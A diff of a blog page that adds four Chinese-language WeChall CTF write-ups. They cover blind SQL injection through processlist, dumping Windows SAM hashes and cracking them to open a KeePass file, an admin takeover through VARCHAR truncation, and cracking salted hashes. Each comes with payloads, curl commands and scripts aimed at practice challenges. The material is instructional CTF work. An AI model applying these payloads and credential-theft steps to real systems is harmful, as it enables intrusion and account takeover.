@@ -235,7 +235,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">345</span>
+          <span class="site-state-item-count">349</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -246,7 +246,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">211</span>
+        <span class="site-state-item-count">212</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -376,6 +376,522 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-table-names-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-table-names-2/" class="post-title-link" itemprop="url">WeChall - Table Names II</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-13 19:33:08 / Modified: 19:33:09" itemprop="dateCreated datePublished" datetime="2026-06-13T19:33:08+08:00">2026-06-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-table-names-2/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-table-names-2/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>Table Names
+的进阶版。题目要求找出隐藏的数据库名和表名，答案格式是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">database_table</span><br></pre></td></tr></table></figure>
+<p>相比第一版，常规的 <code>information_schema.tables</code> /
+<code>database()</code> 路线会被过滤。</p>
+<h3 id="solution">Solution</h3>
+<p>后端查询大致是用隐藏配置拼出完整表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="operator">&lt;</span>secret_database<span class="operator">&gt;</span>.<span class="operator">&lt;</span>secret_table<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password<span class="operator">=</span><span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>不能直接查 <code>information_schema.tables</code> 时，可以转向
+<code>information_schema.processlist</code>。当前正在执行的 SQL
+文本会出现在 <code>processlist.info</code> 中，而这个 SQL 正好包含完整的
+<code>database.table</code>。</p>
+<p>盲注模板：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>test<span class="string">&#x27; OR IF(</span></span><br><span class="line"><span class="string">  (SELECT ASCII(SUBSTR(info, &lt;pos&gt;, 1)) = &lt;ord&gt;</span></span><br><span class="line"><span class="string">   FROM information_schema.processlist</span></span><br><span class="line"><span class="string">   WHERE info LIKE 0x2553454c45435425</span></span><br><span class="line"><span class="string">   LIMIT 1),</span></span><br><span class="line"><span class="string">  1,</span></span><br><span class="line"><span class="string">  0</span></span><br><span class="line"><span class="string">)#</span></span><br><span class="line"><span class="string">password=test</span></span><br></pre></td></tr></table></figure>
+<p>也可以用二分：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASCII(SUBSTR(info, <span class="operator">&lt;</span>pos<span class="operator">&gt;</span>, <span class="number">1</span>)) <span class="operator">&gt;</span> <span class="operator">&lt;</span>mid<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
+<p>逐字符恢复 <code>info</code> 后，从 SQL 文本里抽出
+<code>&lt;secret_database&gt;.&lt;secret_table&gt;</code>，再把点号换成下划线提交。</p>
+<p>通过 <code>SUBSTR(info,1,200)</code> 直接从 processlist
+提取完整查询文本，确认当前账号下数据库和表名为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nurfedtables37.userbobbytable7</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">nurfedtables37_userbobbytable7</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-bill-for-bill/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-bill-for-bill/" class="post-title-link" itemprop="url">WeChall - bill for Bill</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-13 19:28:09 / Modified: 19:28:10" itemprop="dateCreated datePublished" datetime="2026-06-13T19:28:09+08:00">2026-06-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-bill-for-bill/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-bill-for-bill/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>Cracking/Forensics 类（Storyline 系列），由 Z 创作。</p>
+<p>一个叫 Bill 的人把秘密藏在加密的 KeePass 数据库里。需要从他的 Windows
+SAM 文件开始，走完整条攻击链才能拿到最终的答案。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">给的文件: files.zip</span><br><span class="line">├── SAM        # Windows SAM (Security Account Manager)</span><br><span class="line">├── system     # SYSTEM registry hive（对应加密的 boot key）</span><br><span class="line">└── keepass.kdb  # KeePass 1.x KDB 格式</span><br></pre></td></tr></table></figure>
+<h3 id="solution">Solution</h3>
+<h4 id="step-1-从-sam-system-提取-ntlm-hash">Step 1 — 从 SAM + SYSTEM
+提取 NTLM hash</h4>
+<p><code>secretsdump.py</code>（impacket 包）从 SAM + SYSTEM
+离线提取本地用户的 hash：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py -sam SAM -system system LOCAL</span><br><span class="line">Impacket v0.12.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0xac285427313a1c9a8dc2e8b3421a2e22</span><br><span class="line">[*] Dumping local SAM hashes:</span><br><span class="line">Bill:500:7f4ac180230c769790d3d8ad454f5167:cfb69fa6cb1d792d63b02c6eefc807e5:::</span><br></pre></td></tr></table></figure>
+<p>格式：<code>用户:RID:LM_HASH:NTLM_HASH:::</code> NTLM hash（第二个 32
+hex）是 <code>cfb69fa6cb1d792d63b02c6eefc807e5</code>。</p>
+<p>LM hash <code>7f4ac180230c769790d3d8ad454f5167</code> 非空（非
+<code>aad3b4...</code>），说明密码 &gt;= 8 字符，可以用 Ophcrack +
+rainbow table 破解。但走 NTLM 更直接。</p>
+<h4 id="step-2-破解-ntlm-hash">Step 2 — 破解 NTLM hash</h4>
+<p>在线 NTLM 查询 <span class="exturl" data-url="aHR0cHM6Ly9udGxtLnB3">ntlm.pw<i class="fa fa-external-link-alt"></i></span>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://ntlm.pw/cfb69fa6cb1d792d63b02c6eefc807e5</span><br><span class="line">→ W3cH4112u1Z99</span><br></pre></td></tr></table></figure>
+<p>离线可用 john + rockyou 或 hashcat。</p>
+<p>Windows 密码: <code>W3cH4112u1Z99</code></p>
+<p>index2.php 有一段 substitution cipher 隐藏 hint，解码后提示用
+Ophcrack + ~380MB rainbow table 破解 LM hash，但 NTLM
+在线查表更快，结果一致（LM 大写版 <code>W3CH4112U1Z99</code>
+无额外信息）。</p>
+<h4 id="step-3-解密-keepass">Step 3 — 解密 KeePass</h4>
+<p>剧情设计上 Bill 是密码复用受害者——KeePass 密码 == Windows 密码。</p>
+<p>keepass.kdb 是 <strong>KeePass 1.x KDB 格式</strong>（非
+KDBX），AES-256-CBC 加密。Python 库 <code>pykeepass</code> 只支持
+KDBX，需用 <code>libkeepass</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install libkeepass</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libkeepass</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> libkeepass.<span class="built_in">open</span>(<span class="string">&#x27;keepass.kdb&#x27;</span>, password=<span class="string">&#x27;W3cH4112u1Z99&#x27;</span>) <span class="keyword">as</span> db:</span><br><span class="line">    <span class="keyword">for</span> entry <span class="keyword">in</span> db.entries:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Group: <span class="subst">&#123;entry[<span class="string">&#x27;group&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  Title: <span class="subst">&#123;entry[<span class="string">&#x27;title&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  Username: <span class="subst">&#123;entry[<span class="string">&#x27;username&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  Password: <span class="subst">&#123;entry[<span class="string">&#x27;password&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
+<p>KeePass 结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Group: credit card</span><br><span class="line">  Title: Amex</span><br><span class="line">  Username: 371234567895006:08/05-18/05:562</span><br><span class="line">  Password:</span><br><span class="line"></span><br><span class="line">Group: Personal</span><br><span class="line">  Title: Personal data</span><br><span class="line">  Username: William Henry Gates III</span><br><span class="line">  Password:</span><br><span class="line"></span><br><span class="line">Group: W1nd0ws</span><br><span class="line">  Title: My home w1n box</span><br><span class="line">  Username: Bill</span><br><span class="line">  Password: W3cH4112u1Z99</span><br><span class="line"></span><br><span class="line">Group: eMail</span><br><span class="line">  Title: My hotmail account</span><br><span class="line">  Username: BillG@h0tma1l.com</span><br><span class="line">  Password:               ← 空字符串，这就是密码</span><br></pre></td></tr></table></figure>
+<p>四个 entry 分布在 7 个 group 中（另有空的 L1nux、M4C、Backup
+组）。</p>
+<p>关键条目：<code>Amex</code> 的 username 包含完整信用卡数据（格式
+<code>CC_NUMBER:VALID_FROM-EXPIRY:CVV</code>）。</p>
+<h4 id="step-4-提交信用卡">Step 4 — 提交信用卡</h4>
+<p><code>check_card.php</code> 接受 POST 字段
+<code>cc</code>（maxlength=31）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -b &#x27;WC=...&#x27; \</span><br><span class="line">  --data-urlencode &#x27;cc=371234567895006:08/05-18/05:562&#x27; \</span><br><span class="line">  &#x27;https://www.wechall.net/challenge/Z/bill_for_bill/check_card.php&#x27;</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">371234567895006:08/05-18/05:562</span></span>
+<p>返回提示需要登录父亲的邮箱删除交易通知邮件，进入下一步。</p>
+<h4 id="step-5-登录邮箱删邮件">Step 5 — 登录邮箱删邮件</h4>
+<p><code>signin.php</code> 是一个仿 Microsoft Live ID 的钓鱼页面，POST
+到 <code>login.php</code>。</p>
+<p>KeePass 中 email 条目的 password 字段是空字符串——这就是密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST login=BillG@h0tma1l.com&amp;passwd=&amp;SI=Signin&amp;LoginOptions=2</span><br><span class="line">→ 302 Redirect → loggedin.php</span><br></pre></td></tr></table></figure>
+<p>登录后收件箱中有一封来自 M4C 的未读邮件，checkbox 的
+<code>value="thisisit"</code>。通过 <code>loggedin.php?del=sel</code>
+标记删除。</p>
+<p>至此攻击链完成：从 Windows SAM 一路走到删除银行通知邮件。</p>
+<h4 id="step-6-提交-wechall-答案">Step 6 — 提交 WeChall 答案</h4>
+<p>全部分析完成后，在主站 solution form 提交答案：</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">passwordsuxx</span></span>
+<h3 id="summary">Summary</h3>
+<p>完整的 Windows
+凭证盗窃链：<code>SAM+SYSTEM → NTLM hash → 密码复用 → KeePass → 敏感数据泄露 → 登录邮箱销毁证据</code>。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-screwed-signup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-screwed-signup/" class="post-title-link" itemprop="url">WeChall - Screwed Signup</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-11 17:00:23 / Modified: 17:01:30" itemprop="dateCreated datePublished" datetime="2026-06-11T17:00:23+08:00">2026-06-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-screwed-signup/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-screwed-signup/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Screwed Signup (Exploit, PHP) by gizmore MySQL VARCHAR 截断 +
+查询不一致导致的权限提升</p>
+</blockquote>
+<h3 id="challenge">Challenge</h3>
+<p>目标是 login as Admin。题目给了 register/login
+的源码，<code>chall_sql1</code> 表中已有原始 Admin
+记录（<code>access_level=1337</code>）。</p>
+<p>关键源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册 — INSERT 语句</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;INSERT IGNORE INTO `chall_sql1` VALUES (&#x27;<span class="subst">$uname</span>&#x27;, &#x27;<span class="subst">$pw</span>&#x27;, 0)&quot;</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 登录校验</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">screwed_signupGetUser</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM `chall_sql1` WHERE `username`=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="solution">Solution</h3>
+<p>漏洞是 <strong>VARCHAR 截断</strong> +
+<strong>查询不一致</strong>：</p>
+<ul>
+<li>表定义 <code>username VARCHAR(24)</code>，但 PHP 的
+<code>preg_match('/^[a-z0-9A-Z ]{3,64}$/D')</code> 允许最长 <strong>64
+字符</strong></li>
+<li><code>trim()</code> 只去掉首尾空格，中间空格保留</li>
+<li>MySQL 在非严格模式下静默截断超长值到 24 字符</li>
+</ul>
+<p>利用步骤：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. 注册: username = &quot;Admin&quot; + 19空格 + &quot;a&quot;    (共 25 字符)</span><br><span class="line">   → trim() 保留中间空格（a 在末尾不会被 trim 删掉）</span><br><span class="line">   → regex 通过（3-64 字符规则）</span><br><span class="line"></span><br><span class="line">2. UserExists(&quot;Admin&quot; + 19空格 + &quot;a&quot;) → false（表中无此长字符串记录）</span><br><span class="line"></span><br><span class="line">3. MySQL INSERT 时截断到 VARCHAR(24):</span><br><span class="line">   实际写入: &quot;Admin&quot; + 19 空格      (access_level=0)</span><br><span class="line"></span><br><span class="line">4. 现在表中有两条 Admin 记录：</span><br><span class="line">   - 原始 Admin (access_level=1337) ← 先插入</span><br><span class="line">   - 我们复制的 Admin (access_level=0) ← 后插入</span><br><span class="line"></span><br><span class="line">5. 登录: username = &quot;Admin&quot;（无空格）</span><br><span class="line">   → PasswordMatch 检查 username+password → 找到我们的记录（密码匹配）</span><br><span class="line">   → GetUser 只查 username → WHERE username=&#x27;Admin&#x27; → 返回第一行 → 原始 Admin</span><br><span class="line">   → access_level=1337 &gt; 0 → solved</span><br></pre></td></tr></table></figure>
+<p>关键：<strong><code>PasswordMatch</code> 检查了密码但
+<code>GetUser</code>
+只查用户名</strong>，两条查询的不一致导致权限提升。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注册</span></span><br><span class="line">curl -c /tmp/wc -b /tmp/wc -X POST \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/screwed_signup/register.php&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;username=Admin                    a&amp;password=hack123&amp;password2=hack123&amp;register=Register&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line">curl -c /tmp/wc -b /tmp/wc -X POST \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/screwed_signup/login.php&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;username=Admin&amp;password=hack123&amp;login=Login&#x27;</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-wc-hashing-game/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-wc-hashing-game/" class="post-title-link" itemprop="url">WeChall - WC Hashing Game</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-11 14:16:18 / Modified: 14:16:19" itemprop="dateCreated datePublished" datetime="2026-06-11T14:16:18+08:00">2026-06-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-wc-hashing-game/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-wc-hashing-game/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>WC Hashing Game (Cracking) by gizmore 破解两组 hash：WC3（定盐
+MD5）和 WC4（加盐 SHA1）。答案格式：word1,word2,word3,word4</p>
+</blockquote>
+<h3 id="challenge">Challenge</h3>
+<p>两组 hash 列表，各 17 条：</p>
+<ul>
+<li><strong>WC3</strong>（WeChall v3 算法）：固定盐 MD5</li>
+<li><strong>WC4</strong>（WeChall v4 算法）：每条 hash 独立加盐
+SHA1</li>
+<li>答案 = 两组各自最长的两个明文，逗号分隔</li>
+</ul>
+<p>题面示例：<code>wordfrom1,wordfrom1,wordfrom2,wordfrom2</code></p>
+<h3 id="solution">Solution</h3>
+<h4 id="算法">算法</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, string, random</span><br><span class="line"></span><br><span class="line"><span class="comment"># WC3: md5(md5(plaintext) + &quot;zomgsalt&quot;)</span></span><br><span class="line">digest = hashlib.md5(</span><br><span class="line">    hashlib.md5(word.encode()).hexdigest().encode() + <span class="string">b&quot;zomgsalt&quot;</span></span><br><span class="line">).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># WC4: sha1(&quot;zomgsalt4&quot; + password + salt + &quot;zomgsalt4&quot;) + salt</span></span><br><span class="line">t = hashlib.sha1(<span class="string">b&quot;zomgsalt4&quot;</span> + password.encode() + salt.encode() + <span class="string">b&quot;zomgsalt4&quot;</span>)</span><br><span class="line">digest = t.hexdigest() + salt  <span class="comment"># salt 追加到 hash 末尾</span></span><br></pre></td></tr></table></figure>
+<h4 id="攻击路线">攻击路线</h4>
+<ol type="1">
+<li>从 WeChall 页面获取两组 hash 列表（需登录）</li>
+<li>用 rockyou 或类似英文词典做字典攻击</li>
+<li>对每个 word 计算 WC3 hash 匹配；对 WC4 每条 hash 提取尾部 4 字节
+salt，计算后匹配</li>
+<li>排序取最长各两个</li>
+<li>提交格式：<code>longest_wc3,second_wc3,longest_wc4,second_wc4</code></li>
+</ol>
+<p>完整脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从页面提取 hash 列表</span></span><br><span class="line">wc3_hashes = [...]   <span class="comment"># 17 条 hex hash</span></span><br><span class="line">wc4_raw = [...]      <span class="comment"># 17 条 hash+salt（44 hex chars = 40 hash + 8 